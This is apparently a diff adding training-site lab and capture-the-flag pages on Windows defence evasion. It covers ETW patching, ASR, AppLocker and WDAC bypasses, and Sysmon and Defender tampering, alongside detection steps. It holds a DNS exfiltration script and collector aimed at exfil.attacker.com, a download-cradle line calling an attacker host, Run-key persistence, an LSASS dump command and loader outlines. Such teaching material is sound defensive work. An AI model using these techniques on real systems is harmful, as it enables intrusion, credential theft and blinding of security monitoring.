+        <h3>Lab 9: Event Log Evasion — ETW Patching</h3>
+        <p><strong>Objective:</strong> Demonstrate how ETW patching can blind security monitoring, and how to detect this technique.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Baseline: Verify ETW events are generated normally:
+<pre><code class="language-powershell"># Start an ETW consumer for .NET runtime events
+logman create trace "DotNetTrace" -p "Microsoft-Windows-DotNETRuntime" 0x1 -ets
+
+# Run a .NET application
+[System.Reflection.Assembly]::LoadWithPartialName("System.Core")
+
+# Stop and verify events captured
+logman stop "DotNetTrace" -ets
+</code></pre>
+          </li>
+          <li>Implement ETW patch (educational):
+<pre><code class="language-powershell"># Patch concept: Overwrite ntdll!EtwEventWrite with 'ret' instruction
+# This prevents any ETW events from being emitted by the current process
+
+# The approach:
+# 1. Get address of EtwEventWrite in ntdll.dll
+# 2. VirtualProtect to make it writable
+# 3. Write C3 (ret) to first byte
+# 4. Restore protection
+
+# Detection: Monitor for VirtualProtect calls on ntdll.dll .text section
+</code></pre>
+          </li>
+          <li>Detect the ETW patch:
+<pre><code class="language-powershell"># Use integrity checking: compare in-memory ntdll with on-disk copy
+$proc = Get-Process -Id $PID
+$ntdll = $proc.Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
+# Compare .text section bytes with original file
+# Any discrepancy = potential hook/patch
+
+# Also: Sysmon Event 25 (ProcessTampering) may fire
+# Microsoft-Windows-Threat-Intelligence ETW provider detects this
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 10 -->
+      <div class="lab-card">
+        <h3>Lab 10: ASR Rules — Testing &amp; Bypass</h3>
+        <p><strong>Objective:</strong> Enable Attack Surface Reduction rules, test their effectiveness, and explore potential bypass techniques.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Enable ASR rules in audit mode:
+<pre><code class="language-powershell"># Key ASR rule GUIDs:
+# Block Office from creating child processes: D4F940AB-401B-4EFC-AADC-AD5F3C50688A
+# Block Office from creating executable content: 3B576869-A4EC-4529-8536-B80A7769E899
+# Block execution of obfuscated scripts: 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC
+# Block credential stealing from LSASS: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
+# Block process creations from PSExec/WMI: d1e49aac-8f56-4280-b9ba-993a6d77406c
+
+# Set to audit mode (2) first, then block mode (1)
+Set-MpPreference -AttackSurfaceReductionRules_Ids "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" -AttackSurfaceReductionRules_Actions 2
+
+# Enable multiple rules
+$rules = @("D4F940AB-401B-4EFC-AADC-AD5F3C50688A","3B576869-A4EC-4529-8536-B80A7769E899","5BEB7EFE-FD9A-4556-801D-275E5FFC04CC","9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2")
+$actions = @(1,1,1,1)  # 1=Block, 2=Audit
+Set-MpPreference -AttackSurfaceReductionRules_Ids $rules -AttackSurfaceReductionRules_Actions $actions
+</code></pre>
+          </li>
+          <li>Test: Attempt Office macro spawning cmd.exe:
+<pre><code class="language-powershell"># Create a test Word document with macro that runs: Shell("cmd.exe /c whoami")
+# Expected: Blocked by ASR rule D4F940AB
+</code></pre>
+          </li>
+          <li>Check ASR events:
+<pre><code class="language-powershell"># ASR events in Windows Defender Operational log
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | 
+  Where-Object { $_.Id -in @(1121, 1122) } |  # 1121=Block, 1122=Audit
+  Select-Object TimeCreated, Id, Message | Format-Table -Wrap
+</code></pre>
+          </li>
+          <li>Explore bypass: Use allowed parent process that isn't covered by rules:
+<pre><code class="language-powershell"># Some ASR rules only apply to Office processes
+# Excel.exe spawning cmd.exe = blocked
+# But Excel.exe loading a COM object that spawns cmd.exe via a different parent = potential bypass
+# Also: Exclusion paths added by admins may weaken ASR coverage
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionOnlyExclusions
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 11 -->
+      <div class="lab-card">
+        <h3>Lab 11: Sysmon Evasion — Driver Unload &amp; Minifilter Manipulation</h3>
+        <p><strong>Objective:</strong> Practice techniques to evade Sysmon monitoring and understand the detection artifacts left behind.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Verify Sysmon is running and logging:
+<pre><code class="language-powershell"># Check service
+Get-Service Sysmon64
+# Check driver
+fltmc | Select-String "Sysmon"
+# Verify events are flowing
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
+</code></pre>
+          </li>
+          <li>Attempt driver unload:
+<pre><code class="language-powershell"># Try to unload (requires admin + knowing the driver name)
+fltmc unload SysmonDrv
+# If Sysmon was installed with -d custom_name, use that instead
+
+# Verify — this should FAIL if the driver name is wrong
+# Check: fltmc to see if it's still loaded
+</code></pre>
+          </li>
+          <li>Attempt minifilter altitude manipulation:
+<pre><code class="language-powershell"># View current altitude
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Instances\Sysmon Instance" /v Altitude
+
+# Attempt to modify (requires reboot to take effect)
+# WARNING: This can break Sysmon functionality
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d "100000" /f
+</code></pre>
+          </li>
+          <li>Detect the evasion attempts:
+<pre><code class="language-powershell"># Sysmon Event 255 = Sysmon error (driver issues)
+# System Event 7040 = Service state change
+# Security Event 4657 = Registry value modified (if audited)
+Get-WinEvent -FilterHashtable @{LogName='System'; Id=7040} | Where-Object { $_.Message -match "Sysmon" }
+
+# Also: Defender for Endpoint detects fltmc unload attempts
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 12 -->
+      <div class="lab-card">
+        <h3>Lab 12: Full Kill Chain Detection — Correlating Multiple Security Mechanisms</h3>
+        <p><strong>Objective:</strong> Execute a simulated attack chain and correlate events across Defender, Sysmon, Windows Event Logs, and ETW to build a full timeline.</p>
+        <h4>Attack Scenario</h4>
+        <p>Initial Access → Execution → Persistence → Credential Access → Lateral Movement</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Initial Access — Drop payload via HTA file:
+<pre><code class="language-powershell"># Simulate: mshta.exe executes HTA with embedded PowerShell
+mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('powershell -ep bypass -c Write-Host test');close()"
+# Sysmon Event 1: mshta.exe → powershell.exe parent chain
+</code></pre>
+          </li>
+          <li>Execution — AMSI bypass + payload execution:
+<pre><code class="language-powershell"># After AMSI bypass, download and execute
+# Simulated: IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
+# Sysmon Event 3: PowerShell network connection
+# Sysmon Event 22: DNS query to attacker domain
+</code></pre>
+          </li>
+          <li>Persistence — Registry Run key:
+<pre><code class="language-powershell">reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /d "powershell.exe -w hidden -ep bypass -f C:\Users\Public\update.ps1"
+# Sysmon Event 13: Registry value set
+# Security Event 4657: Registry modification (if audited)
+</code></pre>
+          </li>
+          <li>Credential Access — LSASS memory access:
+<pre><code class="language-powershell"># Simulated (do NOT run real mimikatz without authorization)
+# rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (PID of lsass) dump.bin full
+# Sysmon Event 10: Process access to lsass.exe
+# Defender ASR: Credential stealing from LSASS blocked
+</code></pre>
+          </li>
+          <li>Correlate the full timeline:
+<pre><code class="language-powershell"># Build timeline from all sources
+$startTime = (Get-Date).AddMinutes(-30)
+
+# Sysmon events
+$sysmon = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; StartTime=$startTime}
+
+# Security events
+$security = Get-WinEvent -FilterHashtable @{LogName="Security"; StartTime=$startTime; Id=@(4624,4688,4657)}
+
+# Defender events
+$defender = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Windows Defender/Operational"; StartTime=$startTime} -ErrorAction SilentlyContinue
+
+# Merge and sort by time
+$all = $sysmon + $security + $defender | Sort-Object TimeCreated
+$all | Select-Object TimeCreated, LogName, Id, Message | Format-Table -Wrap
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 13 -->
+      <div class="lab-card">
+        <h3>Lab 13: Windows Defender Exclusion Abuse &amp; Detection</h3>
+        <p><strong>Objective:</strong> Demonstrate how attackers abuse Defender exclusions and how to detect exclusion modifications.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Enumerate existing exclusions:
+<pre><code class="language-powershell"># As any user (read access):
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
+
+# Via PowerShell (admin):
+Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
+</code></pre>
+          </li>
+          <li>Add exclusion and drop payload:
+<pre><code class="language-powershell"># Add exclusion (requires admin)
+Add-MpPreference -ExclusionPath "C:\Users\Public\Tools"
+New-Item -ItemType Directory -Path "C:\Users\Public\Tools" -Force
+
+# Place EICAR test file in excluded path
+$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+Set-Content -Path "C:\Users\Public\Tools\eicar.txt" -Value $eicar
+# Expected: NOT detected (exclusion active)
+
+# Same file in non-excluded path
+Set-Content -Path "C:\Users\Public\eicar.txt" -Value $eicar
+# Expected: Detected and quarantined
+</code></pre>
+          </li>
+          <li>Detect exclusion changes:
+<pre><code class="language-powershell"># Defender Operational log - Event ID 5007 (configuration change)
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | 
+  Where-Object { $_.Id -eq 5007 -and $_.Message -match "Exclusion" } |
+  Select-Object TimeCreated, Message | Format-List
+
+# Registry auditing (if configured):
+# Security Event 4657 on HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 14 -->
+      <div class="lab-card">
+        <h3>Lab 14: WFP Filter Enumeration &amp; Callout Driver Analysis</h3>
+        <p><strong>Objective:</strong> Enumerate WFP filters to understand how EDR/security products implement network monitoring, and identify potential bypass opportunities.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Export WFP filter state:
+<pre><code class="language-powershell"># Export all WFP filters to XML
+netsh wfp show filters file="C:\Temp\wfp_filters.xml"
+netsh wfp show state file="C:\Temp\wfp_state.xml"
+
+# Count total filters
+[xml]$filters = Get-Content "C:\Temp\wfp_filters.xml"
+$filters.wfpdiag.filters.item.Count
+</code></pre>
+          </li>
+          <li>Identify security product callout drivers:
+<pre><code class="language-powershell"># List registered WFP callout drivers
+Get-WmiObject -Class Win32_SystemDriver | Where-Object { $_.PathName -match "callout|wfp|network.*filter" } | Select-Object Name, PathName, State
+
+# Check minifilter drivers
+fltmc | Format-Table
+
+# Look for EDR drivers (common names)
+Get-Service | Where-Object { $_.DisplayName -match "Defender|CrowdStrike|Carbon|Sentinel|Cylance|Symantec" }
+</code></pre>
+          </li>
+          <li>Analyze filter rules for gaps:
+<pre><code class="language-powershell"># Parse WFP XML for filter layers and conditions
+# Look for: gaps in coverage, allowed protocols, excluded ports
+Select-String -Path "C:\Temp\wfp_filters.xml" -Pattern "layerKey|filterCondition|actionType" | Select-Object -First 50
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+    </div><!-- end lab tab -->
+
+    <!-- ═══════════════════════════════════════════════════════════════════
+         CTF CHALLENGES TAB
+         ═══════════════════════════════════════════════════════════════════ -->
+    <div class="tab-pane fade" id="ctf" role="tabpanel">
+
+      <h2>CTF Challenges</h2>
+
+      <!-- CTF 1 -->
+      <div class="ctf-card">
+        <h3>Challenge 1: AMSI Evasion Gauntlet</h3>
+        <p><strong>Category:</strong> Defense Evasion | <strong>Difficulty:</strong> Medium</p>
+        <p><strong>Scenario:</strong> You have a PowerShell session on a Windows 10 target with Defender real-time protection enabled. Execute the string <code>"Invoke-Mimikatz -DumpCreds"</code> without triggering AMSI detection. The flag is printed when the string passes AMSI undetected.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Classic AmsiScanBuffer patches are signature-detected — you need a creative variant</li>
+          <li>Consider string manipulation: split, encode, variable substitution before the patch</li>
+          <li>The reflection method targeting <code>amsiInitFailed</code> has known signatures — obfuscate the field name</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>Use Base64 + character substitution to build the bypass dynamically</li>
+          <li>Avoid known string patterns: "AmsiUtils", "amsiInitFailed", "AmsiScanBuffer"</li>
+          <li>Consider using <code>[System.Runtime.InteropServices.Marshal]</code> with dynamically resolved function addresses</li>
+        </ul>
+      </div>
+
+      <!-- CTF 2 -->
+      <div class="ctf-card">
+        <h3>Challenge 2: AppLocker Escape Room</h3>
+        <p><strong>Category:</strong> Execution | <strong>Difficulty:</strong> Medium</p>
+        <p><strong>Scenario:</strong> AppLocker is configured with default rules + DLL rules disabled. All executable rules enforce path-based restrictions blocking <code>C:\Users\*</code> and <code>C:\Temp\*</code>. Script rules block .ps1, .bat, .vbs, .js from user-writable locations. Execute arbitrary code and read the flag at <code>C:\flag.txt</code>.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Default rules allow execution from <code>C:\Windows\*</code> — find writable subdirectories</li>
+          <li>LOLBAS: Which Microsoft-signed binaries can compile and execute inline code?</li>
+          <li>Script rules don't cover all interpreters — what about .NET assemblies?</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>Write MSBuild XML to <code>C:\Windows\Tasks\</code> (world-writable + in allowed path)</li>
+          <li>Execute via <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe</code></li>
+          <li>Alternative: Use <code>InstallUtil.exe</code> with a .NET DLL (DLL rules off)</li>
+        </ul>
+      </div>
+
+      <!-- CTF 3 -->
+      <div class="ctf-card">
+        <h3>Challenge 3: BitLocker Key Hunter</h3>
+        <p><strong>Category:</strong> Forensics / Crypto | <strong>Difficulty:</strong> Hard</p>
+        <p><strong>Scenario:</strong> You've obtained a memory dump from a laptop running BitLocker (TPM-only mode). The laptop was running when the memory was captured via DMA. Extract the BitLocker Full Volume Encryption Key (FVEK) and decrypt the volume image to retrieve the flag.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Use Volatility or custom scripts to search for AES key schedules in memory</li>
+          <li>BitLocker FVEK is an AES-256 key — look for expanded key schedule patterns (240 bytes)</li>
+          <li>Tool: <code>bitlocker-key-finder</code> or bdemount with recovered key</li>
+        </ol>
+        <h4>Solution Approach</h4>
+<pre><code class="language-bash"># Search for BitLocker key pool tag in memory dump
+volatility3 -f memory.dmp windows.bitlocker
+
+# Or use dedicated tool
+python3 bitlocker_key_finder.py memory.dmp
+
+# Mount with recovered FVEK
+bdemount -k FVEK_hex image.raw /mnt/bitlocker/
+cat /mnt/bitlocker/flag.txt
+</code></pre>
+      </div>
+
+      <!-- CTF 4 -->
+      <div class="ctf-card">
+        <h3>Challenge 4: Firewall Tunnel Master</h3>
+        <p><strong>Category:</strong> Network / Evasion | <strong>Difficulty:</strong> Medium</p>
+        <p><strong>Scenario:</strong> You have code execution on an internal host. The Windows Firewall blocks ALL outbound traffic except DNS (UDP 53) and HTTPS to a specific proxy (TCP 443 to 10.0.0.1). Exfiltrate the flag file (500 bytes) to your external server. The flag server only accepts data via HTTP on port 8080.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>DNS is allowed outbound — can you encode data in DNS queries?</li>
+          <li>Each DNS label is max 63 chars, total query max 253 chars — chunk the data</li>
+          <li>Base32/Base64 encode binary data to fit in DNS-safe characters</li>
+        </ol>
+        <h4>Solution Approach</h4>
+<pre><code class="language-powershell"># Encode flag and exfil via DNS queries
+$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\flag.txt"))
+$chunks = $data -split '(.{60})' | Where-Object { $_ }
+$i = 0
+foreach ($chunk in $chunks) {
+    $query = "$i.$chunk.exfil.attacker.com"
+    Resolve-DnsName -Name $query -Type TXT -ErrorAction SilentlyContinue
+    $i++
+}
+</code></pre>
+<pre><code class="language-python"># Attacker-side DNS server (Python)
+from dnslib.server import DNSServer, BaseResolver
+from dnslib import RR, QTYPE, TXT
+import base64
+
+collected = {}
+
+class ExfilResolver(BaseResolver):
+    def resolve(self, request, handler):
+        qname = str(request.q.qname)
+        parts = qname.split('.')
+        if 'exfil' in parts:
+            idx = int(parts[0])
+            data = parts[1]
+            collected[idx] = data
+            print(f"[+] Chunk {idx}: {data}")
+        reply = request.reply()
+        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ok")))
+        return reply
+
+server = DNSServer(ExfilResolver(), port=53, address="0.0.0.0")
+server.start()
+</code></pre>
+      </div>
+
+      <!-- CTF 5 -->
+      <div class="ctf-card">
+        <h3>Challenge 5: Event Log Forensics — Lateral Movement Timeline</h3>
+        <p><strong>Category:</strong> Forensics / DFIR | <strong>Difficulty:</strong> Medium</p>
+        <p><strong>Scenario:</strong> A domain controller was compromised. You're given exported .evtx files (Security, System, Sysmon). Build a complete attack timeline and identify: (1) the initial compromised account, (2) the attacker's source IP, (3) the technique used for lateral movement, (4) the flag hidden in a specific event's command line.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Start with Event 4624 Type 3 (network logons) — find unusual source IPs</li>
+          <li>Correlate 4624 → 4672 → 4688 to find the admin session that ran commands</li>
+          <li>The flag is in a process creation event (4688) command line — look for base64 encoded strings</li>
+        </ol>
+        <h4>Solution Approach</h4>
+<pre><code class="language-powershell"># Load evtx file
+$events = Get-WinEvent -Path "C:\Evidence\Security.evtx"
+
+# Find network logons with unexpected source
+$logons = $events | Where-Object { $_.Id -eq 4624 -and $_.Properties[8].Value -eq 3 }
+$logons | Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='SourceIP';E={$_.Properties[18].Value}} | Sort-Object TimeCreated
+
+# Find command lines with encoded data
+$procs = $events | Where-Object { $_.Id -eq 4688 }
+$procs | Where-Object { $_.Properties[8].Value -match "encodedcommand|frombase64" } | Select-Object TimeCreated, @{N='CmdLine';E={$_.Properties[8].Value}}
+
+# Decode flag
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("ZmxhZ3t...}"))
+</code></pre>
+      </div>
+
+      <!-- CTF 6 -->
+      <div class="ctf-card">
+        <h3>Challenge 6: WDAC Policy Bypass</h3>
+        <p><strong>Category:</strong> Defense Evasion | <strong>Difficulty:</strong> Hard</p>
+        <p><strong>Scenario:</strong> A system has WDAC enforced with a policy that only allows Microsoft-signed binaries and a specific set of LOB applications (signed by "Contoso Corp"). PowerShell runs in Constrained Language Mode. Execute arbitrary C# code to read the flag at <code>C:\Windows\flag.txt</code>.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>PowerShell Constrained Language Mode blocks Add-Type, New-Object for .NET types, and inline C# compilation</li>
+          <li>MSBuild.exe is Microsoft-signed — does the WDAC policy allow it?</li>
+          <li>Check for Microsoft-signed binaries that can execute inline code (LOLBAS)</li>
+          <li>Alternative: Find a Microsoft-signed binary with a known DLL search order vulnerability</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>If MSBuild is allowed: Write a .csproj file with inline C# <code>Task</code> that reads the flag</li>
+          <li>If MSBuild is blocked: Look for other allowed Microsoft binaries that support inline execution</li>
+          <li>Consider: <code>AddInProcess.exe</code> (part of .NET, Microsoft-signed, loads arbitrary assemblies)</li>
+        </ul>
+      </div>
+
+      <!-- CTF 7 -->
+      <div class="ctf-card">
+        <h3>Challenge 7: Sysmon Blind Spot</h3>
+        <p><strong>Category:</strong> Defense Evasion | <strong>Difficulty:</strong> Hard</p>
+        <p><strong>Scenario:</strong> Sysmon is installed with a comprehensive config (logging Process Create, Network Connect, Process Access, File Create, Registry). Execute a reverse shell to your C2 server without generating ANY Sysmon alerts. The SOC is monitoring all Sysmon events in real-time.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Sysmon's config has exclude rules — if you can read it, you know the blind spots</li>
+          <li>Some techniques don't map cleanly to Sysmon events (e.g., direct syscalls for thread creation)</li>
+          <li>Named pipe based C2 over SMB (port 445) might be excluded in domain environments</li>
+          <li>Consider: Can you communicate without creating a new network connection? (port reuse, WinSock hooks)</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>Extract Sysmon config from registry: <code>reg query HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters</code></li>
+          <li>Identify excluded source processes (common: svchost.exe, services.exe)</li>
+          <li>Use direct syscalls (NtCreateThreadEx) to avoid Event 8 (CreateRemoteThread uses the API, not the syscall directly)</li>
+          <li>For network: inject into an already-connected process and reuse its socket</li>
+        </ul>
+      </div>
+
+      <!-- CTF 8 -->
+      <div class="ctf-card">
+        <h3>Challenge 8: Defender Bypass — Custom Loader</h3>
+        <p><strong>Category:</strong> Defense Evasion | <strong>Difficulty:</strong> Hard</p>
+        <p><strong>Scenario:</strong> Microsoft Defender is fully updated with cloud protection, behavioral monitoring, and AMSI enabled. Execute a Meterpreter reverse_https payload on the target. The flag is revealed when the payload successfully calls back to your handler.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Raw msfvenom output will be instantly detected — you need a custom loader</li>
+          <li>Encrypt the shellcode and decrypt at runtime (AES, XOR with complex key)</li>
+          <li>Use indirect syscalls to avoid user-mode hooks on ntdll</li>
+          <li>Separate the loader from the payload — staged delivery</li>
+          <li>Consider: Sleep obfuscation to avoid memory scanners (encrypt shellcode during sleep)</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>Generate raw shellcode: <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw</code></li>
+          <li>XOR/AES encrypt the shellcode with a random key</li>
+          <li>Write a C/C++ loader that: allocates RW memory → decrypts shellcode → changes to RX → creates thread</li>
+          <li>Use syscall stubs instead of Win32 API (avoid ntdll hooks)</li>
+          <li>Sign the loader or use a packer that generates unique hashes</li>
+        </ul>
+      </div>
+
+      <!-- CTF 9 -->
+      <div class="ctf-card">
+        <h3>Challenge 9: ETW Blindside</h3>
+        <p><strong>Category:</strong> Defense Evasion | <strong>Difficulty:</strong> Expert</p>
+        <p><strong>Scenario:</strong> An EDR product relies on ETW (specifically the Threat Intelligence provider) to detect process injection. Perform process injection into a target process (notepad.exe) without the EDR detecting it. The flag is written to a file by your injected shellcode.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>The ETW TI provider runs in kernel mode — you can't patch it from user-mode</li>
+          <li>However, you can patch the <strong>consumer</strong> (EDR process) or the syscall path</li>
+          <li>Alternative: Use techniques that don't trigger TI provider events (not all injection methods are monitored)</li>
+          <li>Consider: Module stomping (overwrite a loaded DLL's .text section) avoids some TI events</li>
+          <li>Thread pool injection (queue APC to existing thread) may generate fewer events than CreateRemoteThread</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>Technique 1: Module stomping — map a sacrificial DLL, overwrite its code section with shellcode</li>
+          <li>Technique 2: Thread execution hijacking — suspend existing thread, modify RIP, resume</li>
+          <li>Technique 3: Callback-based execution — queue shellcode as callback (TLS, vectored exception handler)</li>
+          <li>Key insight: Avoid <code>NtAllocateVirtualMemory</code> with EXECUTE permission (triggers TI event)</li>
+        </ul>
+      </div>
+
+      <!-- CTF 10 -->
+      <div class="ctf-card">
+        <h3>Challenge 10: Log Ninja — Phantom Attack</h3>
+        <p><strong>Category:</strong> Anti-Forensics | <strong>Difficulty:</strong> Expert</p>
+        <p><strong>Scenario:</strong> Execute a full attack chain (privilege escalation + credential dump) on a system with Sysmon, Windows Event Forwarding, and Defender for Endpoint. After the attack, ensure NO evidence remains in any log (event logs, Sysmon, ETW traces). The flag is earned by completing the attack AND passing a forensic review that finds zero artifacts.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>Clearing logs is itself logged (Event 1102) and forwarded in real-time via WEF</li>
+          <li>The phantom technique (killing EventLog threads) prevents NEW events from being written</li>
+          <li>You need to kill logging BEFORE the attack, not after</li>
+          <li>ETW patching in your process prevents ETW-based detections for your actions</li>
+          <li>Even with logs dead, WEF may have already forwarded events if there's a timing gap</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ol>
+          <li>First: Patch ETW in current process (prevent local ETW emission)</li>
+          <li>Second: Implement phantom event log technique — enumerate and suspend EventLog service threads</li>
+          <li>Third: Verify no events are being written (generate test event, check if it appears)</li>
+          <li>Fourth: Execute attack chain (priv esc + cred dump)</li>
+          <li>Fifth: Clean up — resume threads, verify service appears healthy</li>
+          <li>Key risk: WEF forwarding happens on event write — if threads are suspended before attack, forwarded events are prevented too</li>
+        </ol>
+      </div>
+
+      <!-- CTF 11 -->
+      <div class="ctf-card">
+        <h3>Challenge 11: TPM Bus Sniffing Simulation</h3>
+        <p><strong>Category:</strong> Hardware / Crypto | <strong>Difficulty:</strong> Hard</p>
+        <p><strong>Scenario:</strong> You're given a logic analyzer capture file (.sal) from an SPI bus connected to a discrete TPM 2.0 chip during a BitLocker-protected system boot. Extract the Volume Master Key (VMK) from the TPM communication and decrypt the provided disk image to retrieve the flag.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>The TPM unseal operation happens after PCR validation — look for TPM2_Unseal command/response</li>
+          <li>TPM2_Unseal command code: 0x0000015E</li>
+          <li>The response contains the unsealed data (VMK) in plaintext on the bus</li>
+          <li>VMK is used to decrypt the FVEK, which decrypts the volume</li>
+        </ol>
+        <h4>Solution Approach</h4>
+<pre><code class="language-python"># Parse SPI capture for TPM2 commands
+# Look for command code 0x15E (Unseal) and extract response payload
+# The unsealed blob contains the VMK wrapped in a known structure
+
+# After extracting VMK:
+# 1. Derive FVEK from VMK (AES-CCM unwrap)
+# 2. Use dislocker or libbde to decrypt:
+# dislocker -V image.raw -K <VMK_hex> -- /mnt/decrypted/
+</code></pre>
+      </div>
+
+      <!-- CTF 12 -->
+      <div class="ctf-card">
+        <h3>Challenge 12: ASR Rule Bypass — Office Macro Execution</h3>
+        <p><strong>Category:</strong> Initial Access / Evasion | <strong>Difficulty:</strong> Medium</p>
+        <p><strong>Scenario:</strong> A target organization has ASR rule "Block Office applications from creating child processes" (D4F940AB) in enforcement mode. Deliver a macro-enabled document that executes a PowerShell command to read <code>C:\flag.txt</code>. The ASR rule must not trigger.</p>
+        <h4>Hints</h4>
+        <ol>
+          <li>The ASR rule blocks Office from creating <strong>child processes</strong> — but not all execution methods create a child process</li>
+          <li>COM objects executed in-process don't create a new process</li>
+          <li>Scheduled tasks created via COM don't immediately spawn a child of Office</li>
+          <li>Consider: DDE (Dynamic Data Exchange) instead of VBA macros</li>
+        </ol>
+        <h4>Solution Approach</h4>
+        <ul>
+          <li>Method 1: Use VBA to create a scheduled task that runs after a delay — the child process is spawned by <code>svchost.exe</code>, not by Office</li>
+          <li>Method 2: Use VBA to write a file to a startup location — execution happens on next login</li>
+          <li>Method 3: Use .NET COM interop within VBA to execute code in-process (no child process)</li>
+          <li>Key insight: ASR rule checks parent-child relationship — break the direct chain</li>
+        </ul>
+      </div>
+
+    </div><!-- end ctf tab -->
+
+  </div><!-- end tab-content -->
+</div>
+</body>
+</html>
